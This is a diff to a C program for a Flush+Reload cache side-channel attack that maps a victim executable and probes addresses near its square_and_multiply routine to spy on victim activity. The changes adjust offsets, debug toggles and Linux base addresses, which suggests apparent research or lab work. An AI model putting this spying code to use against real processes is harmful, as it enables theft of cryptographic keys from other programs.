@@ -9,7 +9,7 @@
 #define THRESHOLD (int) 180
 #define CYCLE_AMOUNT (int) 200000
 
-#define MEASUREMENT_THRESHOLD // toggle for 0/1 measurements
+//#define MEASUREMENT_THRESHOLD // toggle for 0/1 measurements
 
 // DaGe f+r implementation
 #define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++); // importance?
@@ -18,7 +18,7 @@
 
 #define DEBUG
 //#define DEBUG_PLUS
-#define DEBUG_TIME
+//#define DEBUG_TIME
 
 // probe from paper
 int probe_treshold(char *adrs)
@@ -166,6 +166,7 @@ void lurk(char* target_base_adrs, char **target_adrs, int adrs_amount)
         {
             printf("Detected %d victim activity - starting spy \n", detected);
             spy(target_adrs, adrs_amount);
+            break;
         }
     }
 }
@@ -176,17 +177,20 @@ void control()
     #ifdef TESTEXEC_WINDOWS
     int amount_address_offsets = 2;
     int target_offset[2];
-    target_offset[0]    = 62;
-    target_offset[1]    = 85;
+    target_offset[0]    = 61;
+    target_offset[1]    = 84;
 
-    char* target_base   = (char *) 0x100401080;
+    char* target_base   = (char *) 0x555555555149; 
 
     // base should be 0x100401080 (square_and_multiply) or 0x1004010fe (main)
+
+    // base linux 0x5555555551c7 main, 0x555555555149 sqm
     #endif
     // --------------------
 
-    int map_len         = 10; // max size bytes?
-    int file_descriptor = open("~/Documents/flush-reload/textexec", O_RDONLY); // hard coded path to open the executable used by the victim 
+    int map_len         = 20000; // max size bytes?
+    int file_descriptor = fileno(fopen("/home/jia/Documents/flush-reload/testexec", "r"));     // hard coded path to open the executable used by the victim 
+    printf("fd has value %i\n", file_descriptor);
     void *base          = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED, file_descriptor, 0); // MAP_FILE ignored (?)
     if (base == MAP_FAILED) {
         perror("mmap failed!");
